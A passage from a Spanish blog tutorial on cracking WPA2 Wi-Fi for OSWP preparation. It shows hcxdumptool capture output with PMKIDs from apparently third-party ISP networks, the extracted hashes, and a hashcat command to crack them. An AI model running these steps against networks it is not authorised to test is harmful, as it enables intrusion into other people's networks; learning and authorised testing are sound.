+ANONCE....................: b171ddef15782b90a1026d94331ce261739adc960ab501a5849af0fa067f55fe
+SNONCE....................: 34858945004471ef3d78c90ad55b3f95d2d10a7110b447a2a771302496696048
+
+04:17:08   6 f04f7cd3562f 3c7843e84d9c Total-779D_2.4Gnormal <span class="o">[</span>PMKIDROGUE:230bc6e12064d4557ad6b31aba83d8a9 KDV:2]
+04:17:12  11 f04f7cd3562f 2c79d7fd07fa TOTALPLAY_FD07FA <span class="o">[</span>PMKIDROGUE:4765d871b51bc7605aa34180980bd6da KDV:2]
+04:17:13  11 f04f7cd3562f b0b28f370c54 TOTALPLAY_370C54 <span class="o">[</span>PMKIDROGUE:9fb0eff55a03d437be75455790314386 KDV:2]
+04:17:36   2 f04f7cd3562f f46fed35cea8 Totalplay-2.4G-cea8 <span class="o">[</span>PMKIDROGUE:2986ec13974c1c218d689a68bd90ddd3 KDV:2]
+04:17:47   1 1c4d6662ad30 3ca37ea696f0 Totalplay-76AA <span class="o">[</span>EAPOL:M1M2ROGUE EAPOLTIME:9985 RC:61798 KDV:2]
+04:18:12  11 58e48850d938 9c9726c87d89 INFINITUMC87D89 <span class="o">[</span>EAP REQUEST ID]
+04:18:13  11 f04f7cd3562f b0b28f3701e1 TOTALPLAY_3701E1 <span class="o">[</span>PMKIDROGUE:dfb1e61987c34c26f82a0c203bfb2ff8 KDV:2]
+04:18:21  10 ec8ac43ed11e a4d4b262c37a ON_internet_2.4G_C37A <span class="o">[</span>EAPOL:M1M2 EAPOLTIME:10993 RC:1 KDV:2]
+04:18:21  10 ec8ac43ed11e a4d4b262c37a ON_internet_2.4G_C37A <span class="o">[</span>EAPOL:M2M3 EAPOLTIME:3479 RC:2 KDV:2]
+^C
+terminating...
+❯ 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora usaremos <code class="language-plaintext highlighter-rouge">hcxpcaptool</code> y le daremos el nombre del archivo donde queremos que almacena los <strong>hashes</strong> finales.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ hcxpcaptool <span class="nt">-z</span> Myhashes hola
+
+reading from hola
+                                                
+summary capture file:                           
+<span class="nt">---------------------</span>
+file name........................: hola
+file type........................: pcapng 1.0
+file hardware information........: x86_64
+capture device vendor information: 9cefd5
+file os information..............: Linux 6.1.0-1parrot1-amd64
+file application information.....: hcxdumptool 6.0.5 <span class="o">(</span>custom options<span class="o">)</span>
+network type.....................: DLT_IEEE802_11_RADIO <span class="o">(</span>127<span class="o">)</span>
+endianness.......................: little endian
+<span class="nb">read </span>errors......................: flawless
+minimum <span class="nb">time </span>stamp...............: 14.09.2023 10:17:07 <span class="o">(</span>GMT<span class="o">)</span>
+maximum <span class="nb">time </span>stamp...............: 14.09.2023 10:18:35 <span class="o">(</span>GMT<span class="o">)</span>
+packets inside...................: 2299
+skipped damaged packets..........: 0
+packets with GPS NMEA data.......: 0
+packets with GPS data <span class="o">(</span>JSON old<span class="o">)</span>.: 0
+packets with FCS.................: 0
+beacons <span class="o">(</span>total<span class="o">)</span>..................: 73
+beacons <span class="o">(</span>WPS info inside<span class="o">)</span>........: 16
+beacons <span class="o">(</span>device info inside<span class="o">)</span>.....: 6
+probe requests...................: 9
+probe responses..................: 34
+association requests.............: 2
+association responses............: 29
+reassociation responses..........: 5
+authentications <span class="o">(</span>OPEN SYSTEM<span class="o">)</span>....: 42
+authentications <span class="o">(</span>BROADCOM<span class="o">)</span>.......: 14
+EAPOL packets <span class="o">(</span>total<span class="o">)</span>............: 2103
+EAPOL packets <span class="o">(</span>WPA2<span class="o">)</span>.............: 2103
+PMKIDs <span class="o">(</span>zeroed and useless<span class="o">)</span>......: 364
+PMKIDs <span class="o">(</span>not zeroed - total<span class="o">)</span>......: 5
+PMKIDs <span class="o">(</span>WPA2<span class="o">)</span>....................: 477
+PMKIDs from access points........: 5
+EAP packets......................: 2
+found............................: EAP <span class="nb">type </span>ID
+best handshakes <span class="o">(</span>total<span class="o">)</span>..........: 2 <span class="o">(</span>ap-less: 1<span class="o">)</span>
+best PMKIDs <span class="o">(</span>total<span class="o">)</span>..............: 5
+
+summary output file<span class="o">(</span>s<span class="o">)</span>:
+<span class="nt">-----------------------</span>
+5 PMKID<span class="o">(</span>s<span class="o">)</span> written to Myhashes
+</code></pre></div></div>
+
+<ul>
+  <li>Aquí tenemos los <strong>hashes</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>Myhashes
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: Myhashes
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 230bc6e12064d4557ad6b31aba83d8a9<span class="k">*</span>3c7843e84d9c<span class="k">*</span>f04f7cd3562f<span class="k">*</span>546f74616c2d373739445f322e34476e6f726d616c
+   2   │ 4765d871b51bc7605aa34180980bd6da<span class="k">*</span>2c79d7fd07fa<span class="k">*</span>f04f7cd3562f<span class="k">*</span>544f54414c504c41595f464430374641
+   3   │ 9fb0eff55a03d437be75455790314386<span class="k">*</span>b0b28f370c54<span class="k">*</span>f04f7cd3562f<span class="k">*</span>544f54414c504c41595f333730433534
+   4   │ 2986ec13974c1c218d689a68bd90ddd3<span class="k">*</span>f46fed35cea8<span class="k">*</span>f04f7cd3562f<span class="k">*</span>546f74616c706c61792d322e34472d63656138
+   5   │ dfb1e61987c34c26f82a0c203bfb2ff8<span class="k">*</span>b0b28f3701e1<span class="k">*</span>f04f7cd3562f<span class="k">*</span>544f54414c504c41595f333730314531
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora usaremos <strong>hashcat</strong> y esperaríamos a que nos de la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ hashcat <span class="nt">-m</span> 16800 <span class="nt">-d</span> 1 Myhashes /usr/share/wordlists/rockyou.txt <span class="nt">--force</span>
+</code></pre></div></div>
+
+<h2 id="final">Final</h2>
+
+<ul>
+  <li>Pues bueno gracias por leer y nos vemos en el siguiente <strong>POST</strong> donde vamos a estar resolviendo los challenges de <strong>WifiChallengeLab</strong> <a href="https://wifichallengelab.com/">https://wifichallengelab.com/</a> para aplicar lo aprendiendo e ir preparándonos mucho mas para el <strong>OSWP</strong> bueno algo a saber es que el <strong>OSWP</strong> se sentra mas en el protocolo <strong>WEP</strong> que ya no se usa mucho hay ataques como el <strong>Fake Authentication Attack</strong>, <strong>ARP Replay Attack</strong>, <strong>Chop Chop Attack</strong>, entre otros que también tenemos que entrenar contra ese protocolo para el siguiente post también adjuntare una herramienta en <strong>bash</strong> para automatizar algunos ataques que hicimos hecha por mi así que gracias por leer y nos vemos.</li>
+</ul>
+
+  </div><a class="u-url" href="/hacking-wifi/wpa2/2024/03/20/hacking-wpa2.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
